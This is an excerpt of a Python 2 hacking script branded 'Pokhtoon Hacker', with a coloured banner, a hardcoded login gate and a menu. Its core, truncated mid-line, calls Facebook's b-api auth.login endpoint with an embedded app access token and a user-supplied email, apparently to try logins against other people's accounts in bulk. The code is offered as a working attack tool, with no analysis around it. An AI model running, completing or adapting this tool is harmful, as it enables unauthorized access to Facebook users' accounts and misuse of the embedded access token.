...
jalan("\033[1;96m------------------------V ")                                     
jalan("\033[1;96m------------------------------------")
jalan("\033[1;96mR++L Love
jalan("\033[1;96mPokhtoon
jalan("\033[1;96m🅷🅰🅲🅺🅴🆁
jalan("\033[1;96m🇫​​​​​🇦​​​​​🇳​​​​​ 🇴​​​​​🇫​​​​​
jalan("\033[1;96mASIMKHAN
jalan("\033[1;96mRAMANHUSSAIN
jalan("\033[1;96mMazHar
jalan("\033[1;96mA̴̢̻͇̽͊̔N̸͉͙͖̒̕͝O̵̼̝͇̔̐͝N̴̢͕͉͑̈́͝Á̸̢͙̕͘͜Y̴̘̘͕͐̚͠M̵̦̦͋͌̈́͜Ó̸̢͉̝̒̚Ǘ̴͖̪͓͝S̸̡̝̀͐͆
jalan('\033[1;93m              Welcome to Pokhton Hacker')
print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mShabirBaloch\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "Rahmanhussain"
CorrectPassword = "lovetariqjameelSahib"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:pokhtoon_hacker
	    time.sleep(2)
            loop = 'false'
        else:
...
def menu():
	...
	try:
		...
		keluar()
	os.system("clear") #Dev:Pokhton_hacker
	print logo
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&loc
